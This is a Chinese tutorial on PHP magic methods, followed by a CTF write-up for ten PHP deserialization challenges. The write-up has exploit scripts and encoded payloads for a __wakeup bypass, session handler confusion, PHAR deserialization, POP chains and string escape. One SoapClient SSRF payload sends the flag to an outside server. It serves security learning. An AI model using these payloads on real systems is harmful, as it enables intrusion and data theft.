## php魔术方法
1. ==`__construct()`:==
>`__construct()`用于在创建对象时自动触发
>当使用 new 关键字实例化(一个类时，会自动调用该类的  `__construct()` 方法
```php
<?php
class MyClass {
    public function __construct() {
        echo "已触发 __construct 一次";
    }
}
 
$obj = new MyClass();  // 创建对象时会输出 "已触发 __construct 一次"
?>
```
2. ==`__destruct()`:==
>`__destruct()` 用于在对象被销毁时自动触发
>对象的销毁对象的引用计数减少为零来触发
```php
<?php
class MyClass {
    public function __destruct() {
        echo "已触发 __destruct 一次\n";
    }
}
$obj=new MyClass();//会触发 __destruct
$test = serialize($obj); 
$rest1= unserialize($test);//会触发 __destruct
?>//最终触发两次
```
3. ==`__sleep():`==
>序列化serialize() 函数会检查类中是否存在一个魔术方法sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。
>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组
>如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误
```php
<?php
class test
{
    public $var_1;
    public $var_2;
   
    public function __sleep()   //在对象被序列化时触发
    {
        echo "已触发 __sleep() 一次\n";
        return ['var_1','var_2'];
    }
}
 
$a = new test();
$a -> var_1 = 'var1';
$a -> var_2 = 'var2';
$b = serialize($a);     //会触发 __sleep
var_dump($b);
?>
```
4. ==`__wakeup():`==
>`__weekup()` 用于在反序列化对象时自动调用
>unserialize() 会检查是否存在一个 wakeup() 方法，
>如果存在，则会先调用wakeup()方法，预先准备对象需要的资源，返回void
>常用于反序列化操作中重新建立数据库连接或执行其他初始化操作
>PHP 反序列化中存在一个特性：当序列化字符串中表示对象属性数量的值**大于实际属性数量**时，`__wakeup()`方法会被跳过（不执行）。这是突破的关键。
```php
<?php
class test
{
    public $var_1;
    public $var_2;
    public $var_wakeup;
   
    public function __wakeup()   //在对象被反序列化时触发
    {
        echo "已触发 __wakeup 一次\n";
        $this -> var_wakeup = $this -> var_1;
    }
}
 
$a = new test();
$a -> var_1 = 'var1';
$a -> var_2 = 'var2';
$b = serialize($a);
$c = unserialize($b);   //会触发 __wakeup
var_dump($c);
?>
```
5. ==`__tostring():`==
>`__tostring()` 在对象被当做字符串处理时自动调用
>比如`echo`、`==`、`preg_match()`
```php
<?php
class test
{
    public $var_1;
    public function __tostring()   //对象被当做字符串处理时触发
    {
        echo "已触发 __tostring 一次\n";
        return '1';
    }
}
 
$a = new test;
$a == '123'; //会触发__tostring()
echo $a; //会触发__tostring()
?>//最后触发两次
```
6. ==`__invoke():`==
>`__invoke()` 在对象被当做函数处理时自动调用
```php
<?php
class test
{
    public $var_1='1';
    public function __invoke()   //对象被当做函数处理时触发
    {
        echo "已触发 __invock 一次\n";
    }
}
 
$a = new test('1');
$a(); //以函数的形式处理 $a 从而触发__invoke
?>
```
7. ==`__call():`==
>`__call($method, $args)` 在调用一个不存在的方法时触发, `$args`是数组的形式，其中  , `$method` 是指调用的不存在的方法,即nothingness(),`$args`数组的内容是函数的参数，即`[jfsa,jagi]`
```php
<?php
class test
{
    public function __call($method, $args)   //当调用一个不存在的方法时触发
    {
        echo "已触发 __call 一次\n";
    }
}
 
$a = new test;
$a -> nothingness(jfsa,jagi);    //因为nothingness()方法不存在，所以触发了 __call
?>
```
8. ==`__callStatic():`==
>`__callStatic()`在静态调用或调用成员常量时使用的方法不存在时触发
>该方法必须声明为`static`（静态），否则会报错
```php
<?php
class test
{
 
    static public function __callStatic($method, $args)
    {
        echo "已触发 __callStatic 一次\n"; 
    }
}
 
$a = new test(1);
$a::nothingness('a');
?>
```
`->`用于访问**对象的非静态属性或非静态方法**（即属于某个具体实例化对象的成员）
`对象变量->成员名`（成员可以是属性或方法）。
`::`用于访问**类的静态成员（静态属性、静态方法）** 或**父类的成员**，不需要实例化对象即可使用（也可通过对象访问静态成员）。
`类名::静态成员` 或 `对象变量::静态成员`
9. ==`__set():`==
>`__set()` 在给不存在的成员属性或 “不可访问的属性”(如私有属性)赋值时触发
```php
<?php
class test
{
    public $var_1;
    public $temp;
    public function __construct($var)   //在对象被创建时触发
    {
        echo "已触发 __construct 一次\n";
        $this -> var_1 = $var;
        $this -> var_nothingness = '114514';
    }
 
    public function __set($name, $value)    //在给不存在的成员属性赋值时触发
    {
        echo "已触发 __set 一次\n";
    }
}
 
$a = new test(1);
?>
```
10. ==`__isset():`==
>`__isset()` 在对不可访问属性使用 isset() 或empty() 或者属性不存在时会被触发
```php
<?php
class funny{
    private $var;
    public function __isset($arg1){
        echo 'hello world!';
    }
    }
$test=new funny();
isset($test->$var1);
?>
```
由于 `funny` 类的 `var` 属性是私有的（`private`），在类外部访问时会被视为不存在，因此会触发 `funny` 类的 `__isset` 魔术方法，输出 "hello world!"。我访问的`var1`属性不存在，也会触发isset
11. ==`__unset():`==
>`__unset()` 在对不可访问属性使用 unset() 时会被触发
```php
<?php
class funny{
    private $var;
    public function __unset($arg1){
        echo '$arg1';
    }
    }
$test=new funny();
unset($test->var);
?>
```
`var`是私有属性，不可访问，会触发`unset`,回显`var`
12. ==`__clone():`==
>`__clone()` 当使用 clone 关键字拷贝完成一个对象后就会触发
```php
<?php
class funny{
    private $var;
    public function __clone(){
        echo 'hello world!';
    }
    }
$test=new funny();
$newclass=clone($test);
?>
```
用`$newclass=clone($test);`进行复制，触发`__clone`
13. ==`__get():`==
>`__get()` 当尝试访问不可访问或不存在的属性时会被自动调用
```php
<?php
class Test
{
    private $data = array();
 
    public function __construct($var)
    {
        echo "已触发 __construct 一次\n";
        $this->var_1 = $var;
    }
 
    public function __get($name)
    {
        echo "已触发 __get 一次\n";
        if (isset($this->data[$name])) {
            return $this->data[$name];
        }
    }
 
    public function __set($name, $value)
    {
        echo "已触发 __set 一次\n";
        $this->data[$name] = $value;
    }
}
 
$a = new Test(1);
$a->v = 'a';  // 设置属性
echo $a->v;   // 访问属性
var_dump($a);
?>
```
## 序列化与反序列化
#### 序列化
**原因**：
- 持久化存储对象状态：对象是内存中的动态数据结构，程序运行结束后会被销毁。通过序列化，可以将对象的状态（属性值等）转换为**字符串形式**，从而保存到文件、数据库等持久化介质中。后续需要时，再通过反序列化将字符串恢复为原来的对象，恢复其状态。
- 跨场景传输对象：在不同的执行场景（如进程间通信、网络传输、不同脚本间共享数据）中，内存中的对象无法直接传递。序列化后，对象被转换为标准化的字符串，可通过网络或文件等方式传输，接收方再反序列化为可用的对象。例如：在分布式系统中传递对象、通过 HTTP 会话（Session）共享对象。
- 简化数据处理：对于复杂对象（包含多个属性、嵌套结构），序列化可以将其 “扁平化” 为单一字符串，便于存储和处理，无需手动拼接或解析属性。
#### 反序列化
**成功条件**：**类必须已定义且可访问**，  
反序列化时，PHP 需要找到对应的类定义（包括类名、属性、方法等）。如果类未定义，或定义在当前作用域不可访问（如未引入类文件、权限限制），反序列化会失败（通常返回`__PHP_Incomplete_Class`对象）。
例如：序列化了`User`类的对象，反序列化时必须先通过`require`/`include`加载`User`类的定义文件。
**序列化字符串格式合法**  
序列化后的字符串有严格的格式规范（如`O:4:"User":2:{s:4:"name";s:5:"Alice";s:3:"age";i:20;}`），如果字符串被篡改（如手动修改、传输损坏），会导致格式错误，反序列化失败并抛出异常。
**类的结构兼容**  
反序列化时，类的结构（属性名、类型等）需与序列化时兼容：
- 新增属性：反序列化后新增属性会使用默认值，不影响成功。
- 删除属性：序列化字符串中存在的属性在类中已删除，反序列化时会忽略该属性，不影响成功（但可能丢失数据）。
- 属性类型不兼容：例如序列化时是字符串属性，反序列化时类中该属性改为整数，可能导致数据类型错误，但反序列化本身仍可能成功（取决于数据是否可转换）。  
**无自定义反序列化逻辑阻碍**  
如果类中定义了`__wakeup()`方法（反序列化时自动调用），若该方法内部抛出异常或存在逻辑错误，会导致反序列化失败。
**触发前提**：魔术方法所在的类或对象被调用

## WriteUp
#### un1
```php
<?php 
class SoFun{   
  protected $file='index.php';
// 定义受保护属性 $file，默认值为 'index.php'（受保护属性只能在本类及子类中访问）
 // 定义析构方法 __destruct()，当对象被销毁时自动触发
  function __destruct(){ 
    if(!empty($this->file)) {// 检查 $file 是否不为空  
      if(strchr($this-> file,"\\")===false &&  strchr($this->file, '/')===false)// 检查 $file 中是否不包含反斜杠 "\" 和正斜杠 "/"（禁止路径分隔符，限制为当前目录文件）        
      show_source(dirname (__FILE__).'/'.$this ->file); // 若通过检查，显示当前文件所在目录下的 $file 文件源码（dirname(__FILE__) 是当前文件所在目录）
      else  
        die('Wrong filename.');  
    }  
  }    
  function __wakeup(){// 定义 __wakeup() 魔术方法，反序列化时自动触发 
  $this-> file='index.php'; // 将 $file 强制重置为 'index.php'，试图限制反序列化时的文件修改 
  }   
}  
if (!isset($_GET['tryhackme'])){   show_source(__FILE__);  
}  
else{   
$a=$_GET['tryhackme'];   
  echo $a;  
  unserialize($a);// 对参数值进行反序列化（将字符串还原为对象）  
} ?><!--key in flag1.php-->
```
`__wakeup()` 方法在反序列化时会强制将 `$file` 重置为 `index.php`，但它存在一个漏洞：**当反序列化字符串中声明的对象属性数量大于实际属性数量时，`__wakeup()` 会被跳过**。
```php
<?php
class SoFun{
  protected $file='flag1.php';
}
$a=new SoFun();
$b=serialize($a);
echo urlencode($b);
?>
```
这还不够，这回输出`O%3A5%3A%22SoFun%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A9%3A%22flag1.php%22%3B%7D`将属性数量改为2以绕过`__wakeup`,最终payload为`?tryhackme=O%3A5%3A%22SoFun%22%3A2%3A%7Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A9%3A%22flag1.php%22%3B%7D`
#### un2
源码中`preg_match('/[oc]:\d+:/i', $a)`禁止了`O:3:` `C:3:`的这种形式，不区分大小写，为了绕过这个检测，可以用`O:+5:"funny":0:{}`或者`O:5e0:"funny":0:{}`但是提交时得用url编码一下，`?tryhackme=O%3A%2B5%3A%22funny%22%3A0%3A%7B%7D`
#### un3
根据题目构造poc
```php
<?php
class funny{
    private $password;
    public $verify;
    public function nihao(){
        $this->verify =&$this->password;
    }
} 
$b = new funny();
$b->nihao();
$c=serialize($b);
echo urlencode($c);// 如果要放在 URL 参数里，使用 urlencode()
?>
```
得到
`?tryhackme=O%3A5%3A%22funny%22%3A2%3A%7Bs%3A15%3A%22%00funny%00password%22%3BN%3Bs%3A6%3A%22verify%22%3BR%3A2%3B%7D`但不能使用`$b->verify = $nobodyknow;`这种操作，因为此时 `$nobodyknow` 是未定义的（它只在目标服务器的 `flag3.php` 中存在）。本地运行时 `$nobodyknow` 为 `null`，所以序列化后 `$verify` 的值也是 `null`，但目标服务器上 `$nobodyknow` 是具体值（你不知道），因此 `$verify` 无法与服务器上的 `$password` 相等。但verify又是私有属性只能在类的内部调用，所以可以在内部写一个函数，在外部调用。实现`$this->password === $this->verify`
#### un4
```php
<?php  
include "flag4.php"; ini_set('session.serialize_handler','php');  
session_start();  
class funny{  
    public $a;  
    function __destruct(){  
        global $flag;  
        echo $flag;  
    }  
}  
show_source(__FILE__);  
?>
```
1. **会话序列化配置**：`ini_set('session.serialize_handler','php_serialize');` 表示当前脚本使用 `php_serialize` 方式序列化会话数据（数据格式为 JSON 风格的键值对字符串）。
2. **会话赋值**：如果传入 `tryhackme` 参数，会将其值存入 `$_SESSION['tryhackme']` 中；否则显示当前代码。
3. PHP 会话序列化漏洞的核心是：**当存储会话数据和读取会话数据时使用不同的序列化处理器**，可能导致恶意数据被反序列化执行。
4. 当 `un42.php` 用 `php` 处理器读取时，会将竖线 `|` 前面的内容视为键名（这里为空），后面的内容被当作值反序列化，从而执行恶意代码。
所以访问un42.php,`ini_set('session.serialize_handler','php');`这个用php处理器，处理器不同，可以构造`|O:5:"funny":1:{s:1:"a";N;}`再url编码得到payload`?tryhackme=%7cO%3a5%3a%22funny%22%3a1%3a%7bs%3a1%3a%22a%22%3bN%3b%7d`
然后访问un42.php得到flag
#### un5
源码
```php
<?php  
include "flag5.php";  
class funny{  
    private $a;  
    function __construct() {        
    $this->a = "givemeflag";  
    }  
    function __destruct() {  
        global $flag;  
        if ($this->a === "givemeflag") {  
            echo $flag;  
        }  
    }  
}  
  
if (isset($_GET['tryhackme']) && is_string($_GET['tryhackme'])){  
$a = $_GET['tryhackme'];  
for($i=0;$i<strlen($a);$i++)  
{  
    if (ord($a[$i]) < 32 || ord($a[$i]) > 126) {  
        die("浣犲埌搴曡涓嶈鍟�");
    }  
}  
	unserialize($a);  
} else {    
	show_source(__FILE__);  
}  
?>
```
因为这个用户输入不能有不可见字符，但是又是私有属性，一定会出现空字符。所以可以把表示字符串的小写s改为S，这样就可以识别后面的十六进制,把空字符改为十六进制表示`\00` ,这样就可以绕过。
最终payload
url编码前
```
O:5:"funny":1:{S:8:"\00funny\00a";s:10:"givemeflag";}
```
编码后
```
O%3A5%3A%22funny%22%3A1%3A%7BS%3A8%3A%22%5C00funny%5C00a%22%3Bs%3A10%3A%22givemeflag%22%3B%7D
```
#### un6
```php
<?php  
include "flag6.php";  
class funny{  
    public function pyflag(){  
        global $flag;  
        echo $flag;  
    }  
}  
if (isset($_GET['tryhackme']) && is_string($_GET['tryhackme'])){  
$a = unserialize($_GET['tryhackme']);  
$a();  
} else {    show_source(__FILE__);  
}  
?>
```
这是一个经典的 **PHP 可调用(callable) 反序列化利用**。关键点是：表达式 `$a()` 会把 `$a` 当作 `_callable_` 来调用。PHP 中一个合法的 callable 可以是 `[$object, "methodName"]`（数组形式），因此如果我们让 `unserialize()` 返回这样的数组：第一个元素是 `funny` 类的对象，第二个元素是字符串 `"pyflag"`，那么 `$a()` 就会等价于调用 `$object->pyflag()`，从而打印出 `$flag`。
构造序列化
```php
<?php
// 定义和目标服务端一致的类（仅为了序列化时类名正确）
class funny {
    // 可不放方法，serialize 仍会使用类名和属性
    public function pyflag(){}
}  
// 新建对象并构造要序列化的 payload：[$object, "pyflag"]
$obj = new funny();
$payload = array($obj, "pyflag");
// 序列化
$serialized = serialize($payload);         // 结果类似: a:2:{i:0;O:5:"funny":0:{}i:1;s:6:"pyflag";}
// URL 编码（rawurlencode 推荐用于 URL 路径/参数）
echo urlencode($serialized);
?>
```
或者
```php
<?php
class funny{
    public function pyflag(){
        global $flag;
        echo $flag;
    }
}
$b = new funny();  
$p = [$b,"pyflag"];
echo urlencode(serialize($p));
?>
```
也可以。上传payload得到flag
#### un7
```php
<?php  
include "flag7.php";  
class funny{  
    function __destruct() {  
        global $flag;  
        echo $flag;  
    }  
}  
show_source(__FILE__);  
if (isset($_GET['action'])) {    
	$a = $_GET['action'];  
    if ($a === "check") {        
	    $b = $_GET['file'];  
        if (file_exists($b) && !empty($b)) {  
            echo "$b is exist!";  
        }  
    } else if ($a === "upload") {  
        if (!is_dir("./upload")){            
	        mkdir("./upload");  
        }        
        $filename = "./upload/".rand(1, 10000).".txt";  
        if (isset($_GET['data'])){            file_put_contents($filename, base64_decode($_GET['data']));  
            echo "Your file path:$filename";  
        }  
    }  
}  
?>
```
`funny::__destruct()` 会在对象销毁时 `echo $flag`，所以核心目标是 **让应用在某个时刻去 _反序列化_（或以其它方式载入）一个包含 `funny` 对象元数据的值**，从而触发其 `__destruct()` 并泄露 flag。
代码里直接没有 `unserialize()`，但有两处关键能力：
- `upload` 能把任意内容写到 `./upload/<rand>.txt`（内容由 `base64_decode($_GET['data'])` 决定）；
- `check` 会对任意路径调用 `file_exists($b)`。
	这两点可以组合成一个经典利用链：PHAR 反序列化（phar deserialization）,phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化，
- 先生成一个phar文件，
```php
<?php
class funny{
    function __destruct() {
        global $flag;
        echo $flag;
    }
}
@unlink("exp1.phar");
$phar = new Phar("exp1.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
// 关键：metadata 必须传对象，不用 serialize
$b =new funny();
$phar->setMetadata($b);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
  
$content = file_get_contents('exp1.phar');
echo urlencode(base64_encode($content)) . "<br>";
```
访问会得到base64加密后的文件内容，直接
```
un7.php?action=upload&data=PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%2BDQpGAAAAAQAAABEAAAABAAAAAAAQAAAATzo1OiJmdW5ueSI6MDp7fQgAAAB0ZXN0LnR4dAQAAADUhEZpBAAAAAx%2Bf9i2AQAAAAAAAHRlc3TUm4i0HwuA2AGTrYEY5qG%2F2TrfhwIAAABHQk1C
```
得到路径，再
```
un7.php?action=check&file=phar://upload/7214.txt
```
用phar://伪协议读取文件。得到flag
生成phar文件时很奇怪的一点是直接在vscode里运行，一直不成功，但是放到小皮面板上再访问文件就执行成功了。
#### un8
源码
```php
<?php  
include "flag8.php";  
class a {  
    public $object;  
    public function resolve() {//11.触发了resolve函数
    //array_walk 遍历当前对象（this）的所有属性        
    array_walk($this, function($fn, $prev){
    //属性值$fn的第一个元素是system $prev属性名是ls  ，所以需要$ls = ['system'],最终的到flag
            if ($fn[0] === "system" && $prev === "ls") {  
                echo "Wow, you rce me! But I can't let you do this. There is the flag. Enjoy it:)\n";  
                global $flag;  
                echo $flag; 
            }  
        });  
    }  
    public function __destruct() { //1,销毁时触发，但是object必须是一个对象 
        @$this->object->add(); //2.因为add()是不存在的方法，所以触发__call 
    }  
    public function __toString() { //6.触发__toStrong 
        return $this->object->string;//7.object首先要被实例化为一个对象，string是不存在的属性，访问不存在的属性会触发__get  
    }  
}  
class b {  
    protected $filename;  
    protected function addMe() {  
        return "Add Failed. Filename:".$this->filename;//5.如果filename被实例化为对象，则被当作字符串调用，触发__toString  
    }  
    public function __call($func, $args) {//3.__call被触发，        
    call_user_func([$this, $func."Me"], $args); //4.如果让$this==b ,$func==add,就会调用addMe ,而$args是数组，作为函数的参数
    }  
}  
class c {  
    private $string;  
    public function __construct($string) {        
    $this->string = $string;  
    }  
    public function __get($name) {//8.__get被触发，这里的name参数就是string        
    $var = $this->$name;//9.取$var数组中键为$name 的值（$var是$this->string的赋值结果，需是数组）        
    $var[$name]();//10.将$var[$name]的结果当作可调用对象 / 函数执行（PHP 中 “可调用” 包括：函数名、[对象, 方法名]数组 ,所以得套两层数组,所以需要,new c(["string",[new a,"resolve"]]),这样就调用到了resolve函数
    }  
}  
if (isset($_GET["tryhackme"])) {    
	unserialize($_GET['tryhackme']);  
} else {    
	highlight_file(__FILE__);  
}
```
- array_walk：PHP 内置遍历函数，**遍历对象 / 数组的每个元素**，并将「值」和「键」传入匿名函数；
- 遍历对象时：`对象的属性值` → 匿名函数的`$fn`，`对象的属性名` → 匿名函数的`$prev`
**exp**
```php
<?php
class a {
    public $object;
    public $ls; // 必须有这个属性，值为['system']
}
class b {
    protected $filename; // 受保护属性，需通过反射赋值
}
class c {
    private $string; // 私有属性，需通过反射赋值
}
// 1. 构建最终触发resolve的a实例（a2）
$a2 = new a();
$a2->ls = ['system']; // 满足resolve的条件：$prev=ls，$fn[0]=system
// 2. 构建c实例，让其__get触发a2->resolve()
$c = new c();
// 反射给c的private $string赋值：$c->string["string"] = [$a2, "resolve"]
$refc = new ReflectionClass($c);
$propString = $refc->getProperty('string');
$propString->setAccessible(true);
$propString->setValue($c, ["string" => [$a2, "resolve"]]);
// 3. 构建被b引用的a实例（a1），其object指向c
$a1 = new a();
$a1->object = $c; // a1的__toString触发c的__get
// 4. 构建b实例，给protected $filename赋值为a1
$b = new b();
$refb = new ReflectionClass($b);
$propFilename = $refb->getProperty('filename');
$propFilename->setAccessible(true);
$propFilename->setValue($b, $a1); // b的addMe触发a1的__toString
// 5. 构建入口a实例，其object指向b（触发__destruct）
$a = new a();
$a->object = $b;
// 序列化并URL编码
echo urlencode(serialize($a));
?>
```
解释exp
- `public $ls;` 必须有这个属性，值为`['system']`
- `protected $filename;` 受保护属性，需通过反射赋值,用于触发a的`__toString`
- `private $string;`  私有属性，需通过反射赋值,用于触发`__get`并调用resolve()
- `$a2 = new a();` 构建最终触发resolve的a的实例a2,这个a实例的resolve()会被调用，且需要满足`ls`属性值为`['system']`的条件
- `a2->ls = ['system'];`关键：resolve中array_walk遍历a2时，会找到属性名`ls` 对应值`['system']` 满足`$fn[0] === "system" && $prev === "ls"`,最终输出flag
- `$c = new c();` 构建c实例，让其`__get`触发a2->resolve()
- `$refc = new ReflectionClass($c);` 获取c类的反射类
- `propString = $refc->getProperty('string');` 获取private属性`string`
- `$propString->setAccessible(true);`强制开放访问权限
- `$propString->setValue($c, ["string" => [$a2, "resolve"]]);` 给c的string赋值：`["string"=>[$a2,"resolve"]]`
```php
// 1. $name = "string"（因为访问的是c->string） $name = "string"; 
// 2. $var = $this->string → 即我们赋值的 ["string"=>[$a2,"resolve"]] $var = ["string" => [$a2, "resolve"]]; 
// 3. $var[$name] → $var["string"] → 结果是 [$a2, "resolve"] $var[$name] = [$a2, "resolve"]; 
// 4. $var[$name]() → 执行这个回调 → 等价于 $a2->resolve() [$a2, "resolve"]();
```
- `$a1 = new a();` 构造被b引用的a1实例，关联c实例
- `$a1->object = $c;`关联c实例
- `$b = new b();`构建b实例，关联a1实例
- `$refb = new ReflectionClass($b);`反射操作，突破b类的`protected $filename;`的访问限制。获取b的反射类
- `$propFilename = $refb->getProperty('filename');` 获取protected属性filename
- `$propFilename->setAccessible(true);` 强制开放访问权限
- `$propFilename->setValue($b, $a1);` 给`$b`赋值`$a1` 这样才能触发`__toString`
- `$a = new a();` 构建入口a实例（反序列化的根对象），关联b实例
- `$a->object = $b` 反序列化完成后，`$a`实例被销毁时触发`__destruct` 
- `echo urlencode(serialize($a));` 最后输出序列化再url编码的字符串，url编码是避免特殊字符被转义。
#### un9
源码
```php
<?php  
// POST py=flag&url=yoururl to un92.php and you will get the flag  
if (isset($_GET['tryhackme']) && is_string($_GET['tryhackme'])){  
	$a = unserialize($_GET['tryhackme']);  
	$a->pyflag();  
} else {    
	show_source(__FILE__);  
}  
?>
```
代码要get传参，必须是字符串，传入的参数再被反序列化出一个对象赋值给`$a` ,然后调用里面的`pyflag()`方法。但是靶机里并没有定义pyflag()这个方法，但会强制调用反序列化对象的pyflag()方法，但是没有哪个原生类有pyflag()方法。但是如果对象没有pyflag()方法，PHP会触发对应的魔术方法，
所以可以用SoapClient,因为SoapClient类没有pyflag()方法，他会自动触发他的`__call`魔术方法，进而执行`__doRequest`方法向`location`地址发送HTTP请求。
`user-agent`字段可以用`\r\n`来达到回车换行的效果
**理一下思路**：
- `un9.php`用来传入反序列化`tryhackme`参数->调用对象的pyflag()方法,仅用于触发，无校验。
- `un92.php`接受post请求，校验ip地址为127.0.0.1,校验py=flag->把flag发送到url指定的ip地址，也就是自己服务器的公网ip地址。
- 之所以用`SoapClient`是因为`SoapClient`的user-agent参数可以注入自定义HTTP头/请求体，覆盖默认请求格式，适配`un92.php`的POST表单要求。
**逻辑链条**：
```
构造 SoapClient 实例 → 序列化 + URL 编码 → 传入 un9.php → 反序列化 → 调用 pyflag() → 触发 SoapClient::__call → 向 127.0.0.1:80/un92.php 发送请求 → 满足 IP 校验 + py=flag 参数 → un92.php 把 flag 发送到你的服务器 → 你监听到 flag
```
构造
```php
<?php
$your_server = "http://121.89.81.39:2333";
$post_body = "py=flag&url={$your_server}";
$content_length = strlen($post_body);
$user_agent = "test\r\n" .
              "Content-Type:application/x-www-form-urlencoded\r\n" .
              "Content-Length:{$content_length}\r\n\r\n" .
              $post_body;
$soap = new SoapClient(null, [
    'uri' => 'any',
    'location' => 'http://127.0.0.1:80/un92.php',
    'user_agent' => $user_agent
]);
echo urlencode(serialize($soap));
?>
```
**解释exp**：
- `new SoapClient(null, $options)` 是 “非 WSDL 模式”，无需 SOAP 服务端，仅发送普通 HTTP 请求；
- `uri`是必填的，但没有实际意义，仅满足类的实例化需求。
- `user_agent`可注入任意http请求头，漏洞关键点。
- `user_agent`中第一行的`test\r\n`是任意字符串，仅作为前缀，无任何业务意义。
把得到的payload传入`tryhackme`,就可以再服务器监听到flag![](/image/143.png)
或者可以exp写紧凑些
```php
<?php
$user_agent = "test\r\n"."Content-Type:application/x-www-form-urlencoded\r\n"."Content-Length:36\r\n\r\n"."py=flag&url=http://121.89.81.39:2333";
$soap = new SoapClient(null,['uri'=>'666','location'=>'http://127.0.0.1/un92.php','user_agent'=>$user_agent]);
echo urlencode(serialize($soap));
```
#### un10
看源码
```php
<?php  
include("flag10.php");  
  
class a {  
    public $test_1;  
    public $string;  
    public $test_2;  
  
    public function __construct($test_1, $string, $test_2) {        
	    $this->test_1 = $test_1;//这是为了将变量名赋值给属性        
	    $this->string = $string;        
	    $this->test_2 = $test_2;  
    }  
  
    public static function filePutStr ($string) {  
        return str_replace("\0*\0", "00*00", $string);  
    }  
  
    public static function fileGetStr ($string) {  
        return str_replace("00*00", "\0*\0", $string);  
    }  
  
	public function __wakeup() {        
		$string = str_replace("1", "2", $this->string);//3.这里把string对象当成字符串调用。触发__toString,但要触发__wakeup  
        if ($string == 1) {  
            echo "Egg!!!";  
        } else {  
            echo "No egg, but you can get the flag!";  
        }  
    }  
}  
  
class b {  
    public $a;  
    protected $function;  
  
    public function __toString() {  
        if (is_string($this->a)) {  
            return $this->a;  
        } else if (is_callable($this->a)) {  
            return call_user_func($this->a);//2.可以构造$b->a=['b','fly'],$b是b类的实例，这时$this->a指向的是可调用数组['b','fly']，但要触发__toString  
        } else {  
            return "nope";  
        }  
    }  
    public function fly() {  
        if ($this->function) {  
            global $flag;  
            echo $flag;//1.最终得到flag的地方，由此倒退,看哪里调用fly(),没找到直接调用的，但发现  call_user_func($this->a);可以试一下
        }  
        return "nope";  
    }  
}  
  
if ($_GET["mode"] == "ser" && isset($_GET["data"])) {//如果GET参数mode传入ser  
    if (!is_dir("./tmp")) {      
        @mkdir("./tmp"); //确保./tmp目录存在 
    }  
  
    if (preg_match("/(fly)|(S)/", $_GET["data"])) { //data参数里不能有fly和S 
        die("Don't hack me, please~");  
	} else {//创建a类实例，将用户输入的test_1/data/test_2赋值给属性
	    $a = new a($_GET['test_1'], $_GET["data"], $_GET["test_2"]); 	  
		$data = a::filePutStr(serialize($a));//把\0*\0替换为00*00        
	    file_put_contents("./tmp/".md5($_SERVER["REMOTE_ADDR"]), $data);  
    }  
      
	} else if ($_GET["mode"] == "unser") {//如果GET参数mode传入unser
	$data = file_get_contents("./tmp/".md5($_SERVER["REMOTE_ADDR"]));    
	$data = a::fileGetStr($data); //把00*00替换为\0*\0   
	unserialize($data);//4.反序列化操作触发__wakeup  
} else {    
	highlight_file(__FILE__);  
}
```
**call_user_func()**：`call_user_func(callable $callback, mixed ...$args): mixed`其中`$callback`是可调用对象，`$args`是传给回调的参数（数组形式，可选）。可以用来动态调用函数 / 方法（比如不确定要调用哪个方法时，通过变量指定）。返回函数的执行结果。
这道题把fly和S都过滤了，用十六进制也没法绕过。
但是`test_1/test_2`没有过滤，`a::filePutStr` 会将 `\0*\0` 替换为 `00*00`（长度从 3→4，反替换时 4→3，每替换 1 次长度**减少 2**）。
所以这道题核心是用字符串逃逸，利用 `test_1` 填充 `00*00` 制造「长度差」，让反序列化时 `test_1` 的内容 “吃掉” 原有 `string` 字段的无效部分，从而将恶意 `b` 类对象 “逃逸” 到 `a->string` 字段，绕开过滤并触发 `fly()`
**exp**
```php
<?php
// 1. 定义题目中的类结构（必须和题目一致）
class a {
    public $test_1;
    public $string;
    public $test_2;
}
class b {
    public $a;
    protected $function;
    public function __construct($a, $function) {
        $this->a = $a;
        $this->function = $function;
    }
}
// 2. 构造恶意b对象（触发fly()的核心）
$b = new b([&$b, "fly"], "1"); // 可调用数组+function非空
// 序列化b并绕过滤：fly→FLY，修正引用编号
$bbb = serialize($b);
$bbb = str_replace('R:1', 'r:3', $bbb); // 适配a的上下文
$bbb = str_replace('fly', "FLY", $bbb);  // 绕开fly过滤
// 3. 构造a对象，利用字符串逃逸
$a = new a();
// 3.1 test_1：11个00*00（替换后长度减少22，精准吃掉无效字符）
$test_1_ = str_repeat("00*00", 11); // 替代#替换，更直观
$a->test_1 = $test_1_;
// 3.2 string：拼接逃逸载荷（闭合原有字段+嵌入恶意b+伪造test_2）
$a->string = "\";s:6:\"string\";" . $bbb . "s:6:\"test_2\";s:20:\"";
// 3.3 test_2：空值（仅占位）
$a->test_2 = "";
// 4. 生成URL编码的payload（直接用于访问）
$test_1 = urlencode($a->test_1);
$data = urlencode($a->string);
$test_2 = urlencode($a->test_2);
// 5. 输出最终请求链接
$url = "http://81.71.146.34:5000/un10.php?mode=ser&test_1={$test_1}&data={$data}&test_2={$test_2}";
echo "最终请求链接：\n" . $url;
?>
```
得到pyload上传后显示一片空白，再访问`?mode=unser`得到flag
**解释**：
- 首先看`mode = ser` 接收`test_1/data/test_2` 封装到a类实例后序列化，经字符串替换写入`tmp`目录。
- `mode = unser ` 读取`tmp`下的序列化文件，还原字符后反序列化。
- 过滤规则,`data`参数不能包含fly和大写S,否则直接终止。
- a类，反序列化是触发`__wakeup` 会处理`$string`属性（若`$string`是对象，会触发`__toString`）,
- b类，`__toString`支持，可调用对象，fly()方法中若`$function`为真，则输出flag
- 静态方法`FilePutStr()`会把`\0*\0`替换为`00*00`长度由3变为5。
- 静态方法`FileGetStr()`会把`00*00`替换为`\0*\0`长度由5变回3。
- 如果`$data`的内容里全是`00*00`，则每次替换长度会减少2，可以用字符串逃逸。
- php反序列化的核心特性：严格按照序列化串中声明的长度截取内容。
- 利用长度差，让`test_1`的内容吃掉`string`字段的无效部分，把恶意b类对象逃逸到`a->string`字段。绕开data的字段。
- 正常a类序列化格式，
```php
O:1:"a":3{
	s:6:"test_1";s:55:"00*0000*00...";//声明长度55
	s:6:"string";s:109:"[data参数内容]";
	s:6:"test_2";s:0:"";
}
```
